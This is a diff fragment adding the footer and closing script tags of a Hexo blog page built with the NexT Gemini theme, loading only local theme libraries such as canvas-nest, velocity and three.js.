+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
